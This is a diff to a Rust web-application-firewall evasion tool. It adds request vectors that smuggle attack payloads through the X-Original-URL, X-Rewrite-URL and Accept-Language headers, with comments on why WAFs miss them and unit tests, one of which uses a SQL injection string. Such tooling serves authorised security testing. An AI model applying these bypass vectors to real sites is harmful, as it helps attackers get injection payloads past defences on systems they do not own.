@@ -186,6 +186,20 @@ pub const VECTORS: &[Vector] = &[
     // `<path:p>`) read the raw path segment. New attack axis
     // distinct from every other vector.
     Vector { name: "path-segment", content_type: "" },
+    // Proxy reverse-routing headers. WAF inspects the
+    // request-line URI; reverse proxies (ASP.NET via X-Original-URL,
+    // Apache mod_rewrite, IIS UrlRewrite, Symfony's
+    // X-Original-URL / X-Rewrite-URL handling) re-route based on
+    // the header, sending the request to a DIFFERENT internal
+    // path. The classic admin-panel-bypass class extended to
+    // payload routing — payload lives in the override target.
+    Vector { name: "x-original-url", content_type: "" },
+    Vector { name: "x-rewrite-url", content_type: "" },
+    // Accept-Language with payload. Some apps log/render the
+    // Accept-Language header (i18n logic, locale fallback
+    // resolution, audit). WAFs that inspect Accept-Language do
+    // so for bot-detection, not for SQL/XSS/cmdi patterns.
+    Vector { name: "accept-language", content_type: "" },
     Vector { name: "x-forwarded-for", content_type: "" },
     Vector { name: "referer", content_type: "" },
 ];
@@ -701,6 +715,29 @@ fn build_request_for_vector(
             let encoded = urlencoding::encode(payload);
             let url = splice_payload_into_path(target, &encoded);
             Some(http.get(url))
+        }
+        "x-original-url" | "x-rewrite-url" => {
+            let header_name = if vector.name == "x-original-url" {
+                "X-Original-URL"
+            } else {
+                "X-Rewrite-URL"
+            };
+            // Override target carries the payload as a path
+            // segment. URL bytes percent-encoded so the header
+            // value stays single-line.
+            let encoded = urlencoding::encode(payload);
+            Some(
+                http.get(target)
+                    .header(header_name, format!("/{encoded}")),
+            )
+        }
+        "accept-language" => {
+            // Accept-Language carrying payload. We embed the
+            // payload as if it were a language tag — backends
+            // that log the raw header (or use it in template
+            // expansion / SQL select-language queries) flow the
+            // attack through.
+            Some(http.get(target).header("Accept-Language", payload))
         }
         "hpp" => {
             let url = format!(
@@ -2969,6 +3006,114 @@ mod tests {
     fn round_four_vectors_are_in_catalogue() {
         let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
         for required in ["cookie-hpp", "path-segment"] {
+            assert!(names.contains(required), "missing vector {required}");
+        }
+    }
+
+    // ── x-original-url / x-rewrite-url ────────────────────────
+
+    #[test]
+    fn build_x_original_url_sets_header_with_payload_path() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "x-original-url").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/safe", "q", "ADMIN", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let hdr = req.headers().get("x-original-url").unwrap().to_str().unwrap();
+        assert!(hdr.starts_with("/"), "must start with /: {hdr}");
+        assert!(hdr.contains("ADMIN"));
+    }
+
+    #[test]
+    fn build_x_rewrite_url_uses_distinct_header_name() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "x-rewrite-url").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert!(req.headers().contains_key("x-rewrite-url"));
+        assert!(!req.headers().contains_key("x-original-url"));
+    }
+
+    #[test]
+    fn build_x_original_url_request_line_still_targets_original_path() {
+        // The wire request-line URI must STILL be the operator's
+        // target — the override goes only in the header. Anti-rig:
+        // a refactor that put the override into the URL too would
+        // double-up and hit the WAF rules anyway.
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "x-original-url").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/safe", "q", "ADMIN", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let url = req.url().to_string();
+        assert!(url.contains("/safe"), "request-line URI keeps the target: {url}");
+        assert!(!url.contains("/ADMIN"), "override must NOT be in the URL: {url}");
+    }
+
+    #[test]
+    fn build_x_original_url_percent_encodes_unsafe_chars() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "x-original-url").unwrap();
+        let req = build_request_for_vector(v, &h, "http://example.com/", "q", "admin?x=y", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let hdr = req.headers().get("x-original-url").unwrap().to_str().unwrap();
+        // `?` must be %3F so the header value stays a single
+        // path-shape string (no inline query split).
+        assert!(hdr.contains("%3F") || hdr.contains("%3f"), "hdr: {hdr}");
+    }
+
+    #[test]
+    fn build_x_original_url_uses_get_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "x-original-url").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "GET");
+    }
+
+    // ── accept-language ───────────────────────────────────────
+
+    #[test]
+    fn build_accept_language_carries_payload_verbatim() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "accept-language").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "' OR 1=1--", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        // The Accept-Language header value contains the payload
+        // bytes. reqwest accepts arbitrary visible ASCII; non-ASCII
+        // payloads route through the same wire path because
+        // header-value validation is "non-control bytes" only.
+        let hdr = req.headers().get("accept-language").unwrap().to_str().unwrap();
+        assert!(hdr.contains("' OR 1=1--"));
+    }
+
+    #[test]
+    fn build_accept_language_uses_get_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "accept-language").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "GET");
+    }
+
+    // ── catalogue presence (round 5) ──────────────────────────
+
+    #[test]
+    fn round_five_vectors_are_in_catalogue() {
+        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
+        for required in ["x-original-url", "x-rewrite-url", "accept-language"] {
             assert!(names.contains(required), "missing vector {required}");
         }
     }
